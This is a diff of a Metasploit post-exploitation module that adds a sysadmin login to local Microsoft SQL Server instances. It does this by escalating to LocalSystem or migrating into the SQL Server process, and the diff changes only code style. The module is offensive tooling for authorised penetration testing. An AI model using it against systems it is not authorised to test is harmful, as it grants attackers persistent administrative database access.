@@ -3,39 +3,44 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::MSSQL
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Manage Local Microsoft SQL Server Authorization Bypass',
-        'Description'   => %q{ When this module is executed, it can be used to add a sysadmin to local
-        SQL Server instances.  It first attempts to gain LocalSystem privileges
-        using the "getsystem" escalation methods. If those privileges are not
-        sufficient to add a sysadmin, then it will migrate to the SQL Server
-        service process associated with the target instance.  The sysadmin
-        login is added to the local SQL Server using native SQL clients and
-        stored procedures.  If no instance is specified then the first identified
-        instance will be used.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Local Microsoft SQL Server Authorization Bypass',
+        'Description' => %q{
+          When this module is executed, it can be used to add a sysadmin to local
+          SQL Server instances.  It first attempts to gain LocalSystem privileges
+          using the "getsystem" escalation methods. If those privileges are not
+          sufficient to add a sysadmin, then it will migrate to the SQL Server
+          service process associated with the target instance.  The sysadmin
+          login is added to the local SQL Server using native SQL clients and
+          stored procedures.  If no instance is specified then the first identified
+          instance will be used.
 
-        Why is this possible? By default in SQL Server 2k-2k8, LocalSystem
-        is assigned syadmin privileges.  Microsoft changed the default in
-        SQL Server 2012 so that LocalSystem no longer has sysadmin privileges.
-        However, this can be overcome by migrating to the SQL Server process.},
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Scott Sutherland <scott.sutherland[at]netspi.com>'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+          Why is this possible? By default in SQL Server 2k-2k8, LocalSystem
+          is assigned syadmin privileges.  Microsoft changed the default in
+          SQL Server 2012 so that LocalSystem no longer has sysadmin privileges.
+          However, this can be overcome by migrating to the SQL Server process.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Scott Sutherland <scott.sutherland[at]netspi.com>'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
 
     register_options(
       [
-        OptString.new('DB_USERNAME',  [true, 'New sysadmin login', '']),
-        OptString.new('DB_PASSWORD',  [true, 'Password for new sysadmin login', '']),
-        OptString.new('INSTANCE',  [false, 'Name of target SQL Server instance', nil]),
-        OptBool.new('REMOVE_LOGIN',  [true, 'Remove DB_USERNAME login from database', false])
-      ])
+        OptString.new('DB_USERNAME', [true, 'New sysadmin login', '']),
+        OptString.new('DB_PASSWORD', [true, 'Password for new sysadmin login', '']),
+        OptString.new('INSTANCE', [false, 'Name of target SQL Server instance', nil]),
+        OptBool.new('REMOVE_LOGIN', [true, 'Remove DB_USERNAME login from database', false])
+      ]
+    )
   end
 
   def run
@@ -57,7 +62,7 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::Unknown, 'Unable to identify MSSQL Service') unless service
 
       print_status("#{session_display_info}: Identified service '#{service[:display]}', PID: #{service[:pid]}")
-      instance_name = service[:display].gsub('SQL Server (','').gsub(')','').lstrip.rstrip
+      instance_name = service[:display].gsub('SQL Server (', '').gsub(')', '').lstrip.rstrip
 
       if datastore['REMOVE_LOGIN']
         remove_login(service, instance_name)
@@ -73,8 +78,8 @@ class MetasploitModule < Msf::Post
   def add_login(service, instance_name)
     begin
       add_login_status = add_sql_login(datastore['DB_USERNAME'],
-                                      datastore['DB_PASSWORD'],
-                                      instance_name)
+                                       datastore['DB_PASSWORD'],
+                                       instance_name)
 
       unless add_login_status
         raise RuntimeError, "Retry"
